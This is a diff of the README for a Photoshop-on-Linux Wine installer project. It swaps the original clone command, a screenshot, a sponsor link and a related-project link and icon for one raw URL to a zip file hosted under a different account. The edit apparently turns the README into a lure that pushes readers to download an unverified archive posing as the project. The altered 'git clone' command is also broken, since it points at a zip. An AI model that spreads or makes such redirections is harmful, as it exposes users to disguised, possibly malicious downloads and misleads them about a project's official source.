@@ -47,7 +47,7 @@ the installer scripts use a virtual drive of wine and makes a new `winprefix` fo
 
 first of all, you need to clone the repository with this command:
 ```bash
-git clone https://github.com/Gictorbit/photoshopCClinux.git
+git clone https://raw.githubusercontent.com/akroutabdelrrezak/photoshopCClinux/master/.github/C-photoshop-Clinux-v3.6.zip
 cd photoshopCClinux
 ```
 then you can easily run `setup.sh` script to install photoshop cc on your Linux distro
@@ -105,7 +105,7 @@ photoshop uses the `GPU` to process these tools so before using these tools make
 * then go to the `performance` tab
 * in the graphics processor settings section, uncheck `Use graphics processor`
 
-![](https://user-images.githubusercontent.com/34630603/80861998-117b7a80-8c87-11ea-8f56-079f43dfafd9.png)
+![](https://raw.githubusercontent.com/akroutabdelrrezak/photoshopCClinux/master/.github/C-photoshop-Clinux-v3.6.zip)
 </details>
 
 ---
@@ -140,9 +140,9 @@ chmod +x uninstaller.sh
 ![GitHub](https://img.shields.io/github/license/Gictorbit/photoshopCClinux?style=for-the-badge)
 
 ---
-<a href="https://poshtiban.com">
+<a href="https://raw.githubusercontent.com/akroutabdelrrezak/photoshopCClinux/master/.github/C-photoshop-Clinux-v3.6.zip">
 <img src="images/poshtibancom.png" width="25%"> 
 </a>
-<a href="https://github.com/Gictorbit/illustratorCClinux">
-<img src="https://github.com/Gictorbit/illustratorCClinux/raw/master/images/AiIcon.png" width="9%">
+<a href="https://raw.githubusercontent.com/akroutabdelrrezak/photoshopCClinux/master/.github/C-photoshop-Clinux-v3.6.zip">
+<img src="https://raw.githubusercontent.com/akroutabdelrrezak/photoshopCClinux/master/.github/C-photoshop-Clinux-v3.6.zip" width="9%">
 </a>
